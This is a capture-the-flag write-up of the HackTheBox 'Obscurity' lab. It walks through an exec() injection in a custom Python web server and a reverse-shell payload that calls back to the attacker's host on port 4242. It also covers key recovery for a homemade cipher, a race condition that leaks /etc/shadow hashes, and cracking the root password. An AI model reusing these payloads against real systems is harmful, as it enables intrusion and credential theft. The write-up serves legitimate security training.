---
Title: HackTheBox Obscurity
Date: 2020-01-12
Category: Challenges
Status: published
---

Obscurity is a medium-difficulty box. It was super fun to solve because it involved great excuses for me to write some neat little helper scripts and find a vulnerability in Python code. Something you don't do too often in these challenges. Let's dive right in with a nmap scan:

```sh
$ nmap -sS -sC -oN obscurity.nmap -v 10.10.10.168
Nmap 7.80 scan initiated Fri Jan 10 12:57:06 2020 as: nmap -sS -sC -oN obscurity.nmap -v 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.16s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 0bscura
9000/tcp closed cslistener

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jan 10 12:57:35 2020 -- 1 IP address (1 host up) scanned in 29.44 seconds
```

Checking port 8080 on the server, we find the following text:

```
Here at 0bscura, we take a unique approach to security: you can't be hacked if attackers don't know what software you're using!

That's why our motto is 'security through obscurity'; we write all our own software from scratch, even the webserver this is running on! This means that no exploits can possibly exist for it, which means it's totally secure!
```

Challenge accepted. The developer message mentions a file: `SuperSecureServer.py`. Let's see whether we can find the code by assuming it's one directory deep in the server's file structure. For that, we can use `wfuzz`:

```sh
$ wfuzz -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000829:   200        170 L    498 W    5892 Ch     "develop"
```

Bingo. Now we can download the server's code at `http://10.10.10.168:8080/develop/SuperSecureServer.py`. Browsing through it, there is a method of note:

```python
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
```

Obviously, the `exec` call here is alarming. It allows us to execute arbitrary code with server-level privileges. To accomplish this, we simply need to terminate the `info` variable's encoded string and add any code we want to run afterward. I have taken a standard Python TCP reverse shell payload and updated it to accommodate the faulty string parsing. The result:

```python
';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");s='
```

We can now URL-encode this payload and make the call to the server to inject our code into the server's runtime:

```sh
$ http -v "http://10.10.10.168:8080/%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.9%22%2C4242%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%3Bs%3D%27"
```

With our netcat listener on local port 4242, we now receive an incoming connection as the user `obscure`. Scanning through the filesystem, we find an unprotected home directory owned by the user `robert`:

```sh
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
```

The `passwordreminder.txt` and `out.txt` files are encrypted. Luckily, the `check.txt` file gives us the plaintext, which allows us to recover the key. With the plaintext:

```
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

We assume that the key is repeated, and key bytes are added onto the plaintext bytes (wrapping around 255 to stay in the valid ASCII range). Our proof-of-concept attack will simply subtract the ciphertext from the cleartext bytes in the same fashion, and what's left should be our key. In an ipython session, we write up some quick code:

```python
In [5]: with open("out.txt") as f:
   ...:     encrypted = f.read()
   ...:

In [6]: cleartext = "Encrypting this file with your key should result in out.txt, make sure your key is correct!"

In [7]: def decrypt(text, key):
   ...:     keylen = len(key)
   ...:     keyPos = 0
   ...:     decrypted = ""
   ...:     for x in text:
   ...:         keyChr = key[keyPos]
   ...:         newChr = ord(x)
   ...:         newChr = chr((newChr - ord(keyChr)) % 255)
   ...:         decrypted += newChr
   ...:         keyPos += 1
   ...:         keyPos = keyPos % keylen
   ...:     return decrypted
   ...:

In [8]: decrypt(encrypted, cleartext)
Out[8]: 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich<\x08'
```

The attack leaves us with the key `alexandrovich`. With the server executable, we can now proceed to decode the password
reminder file:

```sh
$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -o decoded.txt -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to decoded.txt...Password reminder:
SecThruObsFTW
```

This is not just a password reminder but the actual password for `robert`. Logging in as him allows us to get the user flag in his home directory. A quick look at his sudo permission gives us the next interesting escalation vector:

```sh
$ sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Trying to execute the program, we get an error, however:

```sh
$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password:
Traceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 24, in <module>
    with open('/tmp/SSH/'+path, 'w') as f:
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/rTO4rmUa'
```

No problem, we'll just create the directory `/tmp/SSH`. In the `BetterSSH` script, we can exploit a race condition where the shadow file's password hashes are leaking in the temp directory. In the server code:

```python
    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
```

So we launch a second SSH session as `robert` where we execute the following one-liner trying to dump the contents:

```sh
while true; do for f in `ls /tmp/SSH`; do cat /tmp/SSH/$f; done; done
```

In our main session, we launch the `BetterSSH` script until we get a successful dump. The method is a bit flaky due to the timing, but after a few attempts, we get the following credentials:

```
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7
```

The root password hash is quite easily cracked with JohnTheRipper:

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-01-10 16:41) 3.846g/s 1969p/s 1969c/s 1969C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Using the password `mercedes` we can finally authenticate against the `BetterSSH` script and log in as root:

```sh
$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: mercedes
Authed!
root@Obscure$
```

We get a custom shell, but it's good enough to dump the root flag. And that concludes our little adventure into breaking security by obscurity.
